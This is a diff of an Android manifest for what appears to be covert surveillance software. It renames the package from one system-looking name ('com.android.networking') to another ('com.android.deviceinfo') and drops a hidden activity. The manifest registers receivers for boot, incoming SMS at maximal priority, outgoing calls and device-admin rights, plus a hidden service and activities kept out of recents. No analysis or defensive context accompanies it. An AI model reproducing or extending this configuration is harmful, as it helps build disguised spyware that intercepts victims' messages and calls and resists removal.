@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-	package="com.android.networking" android:versionCode="1"
+	package="com.android.deviceinfo" android:versionCode="1"
 	android:versionName="1.0">
 	<!-- @CAVEAT@ -->
 	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
@@ -36,7 +36,7 @@
 	
 	<application android:icon="@drawable/icon" android:label="@string/app_name" android:debuggable="@DEBUGGABLE@" android:allowBackup="false">
 	
-		<activity android:name="com.android.networking.gui.AGUI"
+		<activity android:name=".gui.AGUI"
 			android:label="@string/app_name" android:excludeFromRecents="true"
 			android:enabled="true">
 			<intent-filter>
@@ -44,20 +44,15 @@
 				<category android:name="android.intent.category.LAUNCHER" />
 			</intent-filter>
 		</activity>
-		
-		<activity android:name="com.android.networking.gui.CGui"
-			android:label="cgui" android:excludeFromRecents="true"
-			android:enabled="true" android:theme="@style/Theme.Tr6871623">
-		</activity>
 
-		<service android:name="com.android.networking.ServiceMain" android:exported="false"
+		<service android:name=".ServiceMain" android:exported="false"
 			android:excludeFromRecents="true">
 			<intent-filter>
-				<action android:name="com.android.networking.app"/>		
+				<action android:name="com.android.deviceinfo.app"/>		
 			</intent-filter>
 		</service>
 
-		<receiver android:name="com.android.networking.BM">
+		<receiver android:name=".BM">
 			<intent-filter>
 				<action android:name="android.intent.action.BOOT_COMPLETED" />
 				<action android:name="android.intent.action.USER_PRESENT" />
@@ -69,19 +64,19 @@
             </intent-filter>
 		</receiver>
 
-		<receiver android:name="com.android.networking.listener.BAc">
+		<receiver android:name=".listener.BAc">
 		</receiver>
 
-		<receiver android:name="com.android.networking.listener.BSt">
+		<receiver android:name=".listener.BSt">
 		</receiver>
 
-		<receiver android:name="com.android.networking.listener.BSm">
+		<receiver android:name=".listener.BSm">
 			<intent-filter android:priority="999999999">
 				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
 			</intent-filter>
 		</receiver>
 
-		<receiver android:name="com.android.networking.listener.BC"
+		<receiver android:name=".listener.BC"
 			android:exported="true">
 			<intent-filter android:priority="0">
 				<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
@@ -91,7 +86,7 @@
 		</receiver>
 		
 		<receiver
-            android:name="com.android.networking.listener.AR"
+            android:name=".listener.AR"
             android:permission="android.permission.BIND_DEVICE_ADMIN" >
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
